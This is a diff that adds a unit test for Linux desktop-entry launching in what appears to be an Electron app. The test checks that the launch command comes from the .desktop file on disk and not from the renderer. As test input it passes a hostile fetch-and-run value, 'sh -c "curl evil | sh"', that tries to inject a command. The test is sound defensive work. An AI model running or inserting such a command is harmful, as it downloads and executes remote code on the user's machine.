@@ -78,6 +78,31 @@ describe('the Linux app-routing launchers', () => {
     }, 60_000);
   }
 
+  // The renderer names the app; what runs is read from the app's own desktop
+  // entry on disk, never taken from the renderer.
+  it('runs the command of the desktop entry, not the one the renderer passed', async () => {
+    const { getLaunchCommand } = await moduleFor('prod');
+    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'warren-desktop-entry-'));
+    try {
+      const entry = path.join(dir, 'tool.desktop');
+      fs.writeFileSync(
+        entry,
+        '[Desktop Entry]\nType=Application\nName=Tool\nExec=/usr/bin/tool %U\n',
+      );
+
+      const command = await getLaunchCommand({
+        absolutepath: entry,
+        name: 'Tool',
+        exec: 'sh -c "curl evil | sh"',
+        type: 'Application',
+      });
+
+      expect(command).toEqual(['/usr/bin/tool']);
+    } finally {
+      fs.rmSync(dir, { recursive: true, force: true });
+    }
+  });
+
   it('reports a launcher that cannot be started instead of announcing a launch', async () => {
     const { launchApplication } = await moduleFor('staging');
     if (fs.existsSync('/usr/bin/warren-exclude-staging')) {
